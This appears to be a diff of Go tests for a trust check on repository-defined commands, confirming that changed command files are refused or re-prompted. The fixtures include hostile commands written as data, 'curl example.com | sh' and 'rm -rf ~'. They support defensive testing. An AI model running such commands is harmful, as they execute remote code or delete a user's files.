@@ -78,7 +78,7 @@ func TestAChangedCommandAsksAgain(t *testing.T) {
 	require.NoError(t, err)
 	r.ended(id)
 
-	writeText(t, filepath.Join(dir, t3File), t3With("magex test && curl example.com | sh"))
+	testutil.WriteFile(t, filepath.Join(dir, t3File), t3With("magex test && curl example.com | sh"))
 
 	changed := r.entry(dir, "t3:Test")
 	assert.Equal(t, TrustChanged, changed.Trust)
@@ -106,7 +106,7 @@ func TestAFileChangedBetweenListAndRunIsRefused(t *testing.T) {
 	dir := r.clone("sdk", "acme-org/sdk", map[string]string{t3File: t3With(magexTest)})
 	e := r.entry(dir, "t3:Test")
 
-	writeText(t, filepath.Join(dir, t3File), t3With("rm -rf ~"))
+	testutil.WriteFile(t, filepath.Join(dir, t3File), t3With("rm -rf ~"))
 
 	_, err := r.svc.Run(t.Context(), RunRequest{Dir: r.shown(dir), Ref: e.Ref, Confirmed: e.SHA256, Remember: true})
 	require.ErrorIs(t, err, ErrChanged)
@@ -125,7 +125,7 @@ func TestAFileChangedUnderTheLockIsRefused(t *testing.T) {
 	// The file changes after the run was worked out, before its Before reads it again
 	// under the clone's lock.
 	svc := r.service(changeFirst{runs: r.engine, change: func() {
-		writeText(t, filepath.Join(dir, t3File), t3With("rm -rf ~"))
+		testutil.WriteFile(t, filepath.Join(dir, t3File), t3With("rm -rf ~"))
 	}})
 
 	_, err := svc.Run(t.Context(), RunRequest{Dir: r.shown(dir), Ref: e.Ref, Confirmed: e.SHA256, Remember: true})
@@ -158,7 +158,7 @@ func TestACustomMagexTargetAsksAgainAfterAMagefilesChange(t *testing.T) {
 	assert.Equal(t, TrustTrusted, r.entry(dir, "magex:deploy").Trust)
 
 	// A file that holds no target changes: the code the target runs may have.
-	writeText(t, filepath.Join(dir, "magefiles", "helpers.go"), "package main\n\nfunc helper() {}\n")
+	testutil.WriteFile(t, filepath.Join(dir, "magefiles", "helpers.go"), "package main\n\nfunc helper() {}\n")
 
 	changed := r.entry(dir, "magex:deploy")
 	assert.Equal(t, TrustChanged, changed.Trust)
@@ -184,7 +184,7 @@ func TestAMagefilesChangeTheListMissedIsCaughtUnderTheLock(t *testing.T) {
 	path := filepath.Join(dir, "magefiles", "types.go")
 	info, err := os.Stat(path)
 	require.NoError(t, err)
-	writeText(t, path, strings.Replace(magefileTypes, "Pipeline", "Pipelinf", 1)+"")
+	testutil.WriteFile(t, path, strings.Replace(magefileTypes, "Pipeline", "Pipelinf", 1)+"")
 	require.NoError(t, os.Chtimes(path, info.ModTime(), info.ModTime()))
 
 	assert.Equal(t, TrustTrusted, r.entry(dir, "magex:deploy").Trust, "the page kept its read")
@@ -360,12 +360,12 @@ func TestRunAgainOfATrustedCommand(t *testing.T) {
 	require.NoError(t, err, "the command the user trusts, unchanged, runs again")
 	assert.Equal(t, scriptrun.StatusSucceeded, r.ended(again).Status)
 
-	writeText(t, filepath.Join(dir, t3File), t3With("magex test:race"))
+	testutil.WriteFile(t, filepath.Join(dir, t3File), t3With("magex test:race"))
 
 	_, err = r.runs.RunAgain(t.Context(), id)
 	require.ErrorIs(t, err, ErrNeedsTrust, "a changed command is looked at again on the page")
 
-	writeText(t, filepath.Join(dir, t3File), t3With(magexTest))
+	testutil.WriteFile(t, filepath.Join(dir, t3File), t3With(magexTest))
 	r.clones.setOrigin(dir, repo.Name{}) // the origin is no longer on GitHub
 
 	_, err = r.runs.RunAgain(t.Context(), id)
